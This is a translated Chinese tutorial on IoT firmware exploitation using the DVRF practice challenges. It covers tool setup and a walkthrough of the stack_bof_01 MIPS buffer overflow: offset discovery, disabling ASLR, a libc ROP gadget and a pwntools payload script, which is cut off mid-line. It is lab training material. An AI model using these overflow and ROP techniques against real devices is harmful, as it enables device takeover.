# IOT设备漏洞挖掘从入门到入门（一）- DVRF系列题目分析
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
我们现在来调试[DVRF系列练习题](https://github.com/praetorian-code/DVRF)
## 所用工具
###  builtroot
下载
    wget http://buildroot.uclibc.org/downloads/snapshots/buildroot-snapshot.tar.bz2
    tar -jxvf buildroot-snapshot.tar.bz2
    cd buildroot
配置
    sudo apt-get install libncurses-dev patch
    make clean
    make menuconfig
    #然后进入到图形化的配置，在Target Architecture中设置目标系统，在toolchain中设置自己主机的内核版本（uname -r）查看，最好在toolchain中也勾选上g++
编译
    sudo apt-get install texinfo
    sudo apt-get install bison
    sudo apt-get install flex
    sudo make
设置路径
    gedit ~/.bashrc
    export PATH=$PATH:/Your_Path/buildroot/output/host/usr/bin
    source ~/.bashrc
###  binwalk
    sudo apt-get install build-essential autoconf git
    sudo apt install binwalk
    sudo apt-get install python-lzma
    sudo apt-get install python-crypto
    sudo apt-get install libqt4-opengl python-opengl python-qt4 python-qt4-gl python-numpy python-scipy python-pip  
    sudo pip install pyqtgraph
    sudo apt-get install python-pip  
    sudo pip install capstone
    # Install standard extraction utilities（必选）  
    sudo apt-get install mtd-utils gzip bzip2 tar arj lhasa p7zip p7zip-full cabextract cramfsprogs cramfsswap squashfs-tools
    # Install sasquatch to extract non-standard SquashFS images（必选）  
    git clone https://github.com/devttys0/sasquatch  
    cd sasquatch && ./build.sh
    # Install jefferson to extract JFFS2 file systems（可选）  
    sudo pip install cstruct  
    git clone https://github.com/sviehb/jefferson  
    (cd jefferson && sudo python setup.py install)
    # Install ubi_reader to extract UBIFS file systems（可选）  
    sudo apt-get install liblzo2-dev python-lzo  
    git clone https://github.com/jrspruitt/ubi_reader  
    (cd ubi_reader && sudo python setup.py install)
    # Install yaffshiv to extract YAFFS file systems（可选）  
    git clone https://github.com/devttys0/yaffshiv  
    (cd yaffshiv && sudo python setup.py install)
    # Install unstuff (closed source) to extract StuffIt archive files（可选） 
    wget -O - http://my.smithmicro.com/downloads/files/stuffit520.611linux-i386.tar.gz | tar -zxv  
    sudo cp bin/unstuff /usr/local/bin/
###  qemu
    sudo apt install qemu
    sudo apt install qemu-user-static
    sudo apt install qemu-system
###  gdb
####  gdb-multiarch
    sudo apt-get install gdb-multiarch
####  pwndbg
    git clone https://github.com/pwndbg/pwndbg
    cd pwndbg
    ./setup.sh
####  现成的交叉编译过的gdbserver
自己弄真的是很麻烦，拿大佬的现成的用一下  
[下载地址](https://github.com/rapid7/embedded-tools/blob/master/binaries)
###  pwntools
    sudo apt-get install libffi-dev
    sudo apt-get install libssl-dev
    sudo apt-get install python
    sudo apt-get install python-pip
    sudo pip install pwntools
###  mipsrop
找到了支持IDA7.0的，哭啦，[下载地址](https://github.com/Iolop/ida7.0Plugin)
###  mips qemu虚拟机
####  下载
从[下载地址](https://people.debian.org/~aurel32/qemu/)里面选择mips或者mipsel的下载。最好把两个都下载下来，分别放在mips文件夹和mipsel文件夹下面方便区分。
####  启动脚本及配置网络环境
######  在本机的mips或者mipsel文件夹下面放两个脚本
1.启动脚本，后面都称之为start.sh（用来启动qemu的）
     #! /bin/sh    
    sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap
2.网络配置脚本，后面都称之为net.sh
    #! /bin/sh
    sudo sysctl -w net.ipv4.ip_forward=1
    sudo iptables -F
    sudo iptables -X
    sudo iptables -t nat -F
    sudo iptables -t nat -X
    sudo iptables -t mangle -F
    sudo iptables -t mangle -X
    sudo iptables -P INPUT ACCEPT
    sudo iptables -P FORWARD ACCEPT
    sudo iptables -P OUTPUT ACCEPT
    sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE
    sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT
    sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT
    sudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0
过程是先启动./start.sh,然后打开另外一个窗口，运行./net.sh
#####  在qemu里面放一个脚本
1.网络配置脚本，后面称之为net.sh
    #！/bin/sh
    ifconfig eth1 192.168.100.2 netmask 255.255.255.0
    route add default gw 192.168.100.254
在qemu里面运行之后，qemu就能ping通外网啦。
## stack_bof_01
###  漏洞分析
首先查看一下源码
    #include 
    #include 
    //Simple BoF by b1ack0wl for E1550
    int main(int argc, char **argv[]){
    char buf[200] ="";
    if (argc rn-By b1ack0wlrn");
        exit(1);
    } 
    printf("Welcome to the first BoF exercise!rnrn"); 
    strcpy(buf, argv[1]);
    printf("You entered %s rn", buf);
    printf("Try Againrn");
    return 0x41; // Just so you can see what register is populated for return statements
    }
    void dat_shell(){
    printf("Congrats! I will now execute /bin/shrn- b1ack0wlrn");
    system("/bin/sh -c");
    //execve("/bin/sh","-c",0);
    //execve("/bin/sh", 0, 0);
    exit(0);
    }
可以看到这里面有一个system函数，并且这个里面有一个strcpy函数，没有对输入的内容限制长度，所以有栈溢出。并且因为main函数是非叶子函数，所以main返回的时候，只要把存放`$ra`寄存器内容的地方覆盖为dat_shell的地址就可以啦。
###  查看文件
通过`file`,`checksec`命令，查看文件的指令架构和保护情况
###  IDA查看
将程序放入到IDA中进行查看，我们根据strcpy可以找到漏洞位置
strcpy的来源是程序运行的参数。
###  本地模拟、调试
1.我们首先进行本地的模拟，我们先编写一个调试启动脚本vi local.sh
    #! /bin/sh
    PORT="1234"
    #INPUT = `python -c "print open('content1',r).read()"`
    cp $(which qemu-mipsel-static) ./qemu
    ./qemu -L ./ -g $PORT ./pwnable/Intro/stack_bof_01 "`cat content`"
    rm ./qemu
这个里面用`cat`去获得，而不是python，是因为python有可能会截断
2.首先确定一个偏移，我们用`python patternLocOffset -c -l 600 -f
content`生成一个输入脚本content，然后用local.sh起起来，用`gdb-multiarch`调试，最终得到寄存器`$ra`的值`0x41386741`,然后用`python patternLocOffset -s
0x41386741 -l 600`得到偏移是204。
3.编写利用脚本，`vi content.py`为
    from pwn import *
    f=open("content","wb")
    data = "a"*204
    data+="bbbb"
    f.write(data)
    f.close()
4.然后我们拿这个content.py生成的content运行，然后调试，可以看到我们已经成功的劫持了控制流。
5.接下来，我们就想直接将dat_shell的地址直接写到上面，然后直接执行，我们尝试了一下，结果出现错误。
可以看到是因为改变了寄存器`$gp`的值，这里引用大佬文章中的内容：
    访问了非法内存，异常了。原因在于，在MIPS中，函数内部会通过$t9寄存器和$gp寄存器来找数据，地址等。同时在mips的手册内默认$t9的值为当前函数的开始地址，这样才能正常的索引。
所以，我们需要先用一个`rop_gadget`给`$t9`赋值，然后我们在`libc.so.0`中找到了一个gadget，如下所示：
    .text:00006B20                 lw      $t9, arg_0($sp)
    .text:00006B24                 jalr    $t9
如果我们想要使用这个gadget的话，我们必须先找到libc的基地址，我比较喜欢用gdb来调试，因为这个没有开启地址随机化，所以我们先关闭地址随机化。
    sudo su
    echo 0 > /proc/sys/kernel/randomize_va_space
然后我们可以根据`vmmap`来得到libc的基地址`0x766e5000`，如下图所示：
6.最后，我们写一下生成content的python脚本：
    from pwn import *
    libc_base = 0x766e5000
    gadget = 0x6b20
    gadget_addr = libc_base + gadget
    shell_addr = 0x400950
    f=open("content","wb")
    data = "a"*204